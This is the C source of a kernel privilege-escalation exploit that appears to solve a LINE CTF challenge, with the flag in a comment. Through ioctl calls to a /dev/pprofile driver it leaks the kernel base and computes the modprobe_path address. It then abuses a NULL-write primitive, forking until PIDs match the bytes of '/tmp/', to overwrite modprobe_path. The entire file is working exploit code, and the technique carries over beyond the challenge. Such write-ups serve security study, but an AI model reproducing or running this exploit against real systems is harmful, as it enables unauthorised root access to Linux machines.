#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <stdint.h>
#include <syscall.h>
#include <string.h>
#include <pthread.h>
#include <sys/mman.h>
#include <signal.h>

// LINECTF{Arbitrary_NULL_write_15_5tr0ng_pr1m1t1v3_both_u53r_k3rn3l_m0d3}

int fd;
struct Req {
    char* name;
    size_t addr;
} req;

struct Rev {
    size_t zero;
    int pid;
    int len;
} rev;


int add( char* name ) {
    req.name = name;
    int r = ioctl( fd , 0x20 , &req );
    if ( r < 0 ) printf( "add error %d\n" , r );
    return r;
}

int dle( char* name ) {
    req.name = name;
    int r = ioctl( fd , 0x40 , &req );
    if ( r < 0 ) printf( "delete error %d\n" , r );
    return r;
}

int put( char* name , size_t addr ) {
    req.name = name;
    req.addr = addr;
    return ioctl( fd , 0x10 , &req );
}


int main(int argc, char *argv[]){

    fd = open( "/dev/pprofile" , O_RDONLY );
    if ( fd < 0 ) {
        puts( "open faild" );
        exit(0);
    }

    add("a");

    size_t addr;
    for ( size_t i = 0 ; i < 0x100 ; ++i ) {
        addr = 0xffffffff008e7000 + 0x1000000 * i;
        if ( !put( "a" , addr ) ) break; 
    }

    size_t kbase = addr - 0x18e7000;
    size_t modprobe_path = kbase + 0x1256f40;
    printf( "[+] kbase = 0x%lx\n" , kbase );
    printf( "[+] modprobe_path = 0x%lx\n" , modprobe_path );

    int path[5] = {0x2f, 0x74, 0x6d, 0x70, 0x032f} , pid;
    for ( int i = 0 ; i < 5 ; ++i ) {
        while(1){
            int pid = fork(), status;
            if ( !pid ) {
                add( "b" );
                put( "b" , &rev );
                if ( (i != 4 && (rev.pid & 0xff) == path[i]) || (i == 4 && (rev.pid & 0xffff) == path[i]) ) {
                    printf( "found %c , write to %d\n" , path[i] , i );
                    put( "b" , modprobe_path - 8 + i );
                }
                dle( "b" );
                exit(0);
            }
            else {
                waitpid(pid, &status, 0);
                if ( (i != 4 && (pid & 0xff) == path[i]) || (i == 4 && (pid & 0xffff) == path[i]) ) break;
            }
        }
    }

	return 0;
}